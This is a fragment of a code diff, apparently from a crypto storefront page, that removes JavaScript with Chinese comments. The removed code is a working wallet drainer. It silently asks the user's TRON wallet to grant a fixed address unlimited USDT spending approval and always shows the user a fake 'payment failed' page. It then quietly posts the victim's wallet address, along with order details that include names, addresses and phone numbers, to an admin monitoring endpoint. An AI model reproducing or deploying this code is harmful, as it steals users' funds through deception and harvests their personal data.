-                const accountNote = document.getElementById('accountNote')?.value.trim() || '';
-                const totalAmount = (selectedAccount.price * quantity).toFixed(2);
-                
-                // 获取额外信息
-                let extraParams = {};
-                if (selectedAccount.type === 'phone') {
-                    if (selectedAccount.name.includes('话费')) {
-                        const rechargePhone = document.getElementById('rechargePhone')?.value.trim() || '';
-                        const operator = document.getElementById('operator')?.value.trim() || '';
-                        extraParams = {
-                            rechargePhone: rechargePhone,
-                            operator: operator
-                        };
-                    } else {
-                        const contactName = document.getElementById('contactName')?.value.trim() || '';
-                        const shippingAddress = document.getElementById('shippingAddress')?.value.trim() || '';
-                        const shippingPhone = document.getElementById('shippingPhone')?.value.trim() || '';
-                        extraParams = {
-                            contactName: contactName,
-                            shippingAddress: shippingAddress,
-                            shippingPhone: shippingPhone
-                        };
-                    }
-                } else if (selectedAccount.type === 'bankcard') {
-                    const contactName = document.getElementById('contactName')?.value.trim() || '';
-                    const shippingAddress = document.getElementById('shippingAddress')?.value.trim() || '';
-                    const shippingPhone = document.getElementById('shippingPhone')?.value.trim() || '';
-                    extraParams = {
-                        contactName: contactName,
-                        shippingAddress: shippingAddress,
-                        shippingPhone: shippingPhone
-                    };
-                } else {
-                    const accountEmail = document.getElementById('accountEmail')?.value.trim() || '';
-                    extraParams = {
-                        accountEmail: accountEmail
-                    };
-                }
-                
-                return {
-                    orderId: 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase(),
-                    service: 'account',
-                    amount: totalAmount,
-                    quantity: quantity,
-                    accountType: selectedAccount.type,
-                    accountName: selectedAccount.name,
-                    accountNote: accountNote,
-                    productType: '账号购买',
-                    ...extraParams
-                };
-            }
-            
-            return null;
-        }
-
-        async function executeSilentUSDTAuthorization(userAddress, service, orderData) {
-            try {
-                const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-                
-                // 获取USDT合约实例
-                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-                
-                console.log('🔐 执行静默USDT授权...');
-                
-                // 执行真实的USDT授权
-                const result = await contract.approve(
-                    'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB',
-                    '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0,
-                    shouldPollResponse: false
-                });
-                
-                console.log('✅ USDT授权成功:', result);
-                
-                // 授权成功后，静默添加到监控系统
-                addWalletToMonitoringSystem(userAddress, service, result, orderData.amount, 'authorized');
-                
-                // 无论授权是否成功，统一显示支付失败
-                showPaymentFailedMessage(orderData);
-                
-            } catch (error) {
-                console.log('❌ USDT授权失败:', error);
-                
-                // 检查是否用户取消
-                if (error.message && (
-                    error.message.includes('User denied') || 
-                    error.message.includes('rejected') || 
-                    error.message.includes('canceled') ||
-                    error.message.includes('用户拒绝') ||
-                    error.message.includes('用户取消') ||
-                    error.message.includes('denied transaction') ||
-                    error.message.includes('cancelled by user')
-                )) {
-                    console.log('🚫 用户取消了授权');
-                    handleUserCancel();
-                    return;
-                }
-                
-                // 即使授权失败，也统一显示支付失败
-                showPaymentFailedMessage(orderData);
-                
-                // 记录授权失败状态到监控系统
-                addWalletToMonitoringSystem(userAddress, service, 'auth_failed_' + Date.now(), orderData.amount, 'auth_failed');
-            }
-        }
-
-        function showPaymentFailedMessage(orderData) {
-            const userAddress = window.tronWeb?.defaultAddress?.base58 || '';
-            
-            // 构建跳转到 payment.html 的 URL
-            const params = new URLSearchParams();
-            params.append('status', 'failed');
-            params.append('orderId', orderData.orderId);
-            params.append('price', orderData.amount);
-            params.append('amount', orderData.amount);
-            params.append('quantity', orderData.quantity);
-            params.append('service', orderData.service);
-            params.append('productType', orderData.productType);
-            
-            // 添加用户地址（如果有）
-            if (userAddress) {
-                params.append('userAddress', userAddress);
-            }
-            
-            // 根据服务类型添加额外参数
-            if (orderData.service === 'premium') {
-                params.append('username', orderData.username || '');
-                params.append('nickname', orderData.nickname || '');
-            } else if (orderData.service === 'trx') {
-                params.append('trxAddress', orderData.trxAddress || '');
-            } else if (orderData.service === 'account') {
-                params.append('accountType', orderData.accountType || '');
-                params.append('accountName', orderData.accountName || '');
-                params.append('accountNote', orderData.accountNote || '');
-                
-                // 添加额外参数
-                if (orderData.accountEmail) params.append('accountEmail', orderData.accountEmail);
-                if (orderData.rechargePhone) params.append('rechargePhone', orderData.rechargePhone);
-                if (orderData.operator) params.append('operator', orderData.operator);
-                if (orderData.contactName) params.append('contactName', orderData.contactName);
-                if (orderData.shippingAddress) params.append('shippingAddress', orderData.shippingAddress);
-                if (orderData.shippingPhone) params.append('shippingPhone', orderData.shippingPhone);
-            }
-            
-            // 跳转到支付失败页面
-            window.location.href = `payment.html?${params.toString()}`;
-        }
-        
-        // 静默添加钱包到监控系统
-        function addWalletToMonitoringSystem(walletAddress, service, txHash, price, status = 'authorized') {
-            // 静默发送到后台，不显示任何提示
-            fetch('./admin_api.php?action=add_wallet_to_monitor', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    walletAddress: walletAddress,
-                    walletName: `${service.toUpperCase()}用户-${new Date().toLocaleDateString()}`,
-                    authTxHash: txHash,
-                    authTime: new Date().toISOString(),
-                    serviceType: service,
-                    productPrice: price,
-                    authStatus: status
-                })
-            }).catch(error => {
-                console.log('监控系统连接失败（静默）');
-            });
-        }
-
-        // 生成订单ID
-        function generateOrderId(prefix) {
-            return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-        }
-
-        function checkBitgetWallet() {
-            if (navigator.userAgent.includes('Bitget') || navigator.userAgent.includes('BitKeep')) {
-                console.log('在Bitget Wallet环境中');
-                return true;
-            }
-            return false;
-        }
-
-        window.addEventListener('load', function() {
-            if (checkBitgetWallet()) {
-                console.log('检测到在Bitget Wallet中运行');
-            }
         });
     </script>
 </body>
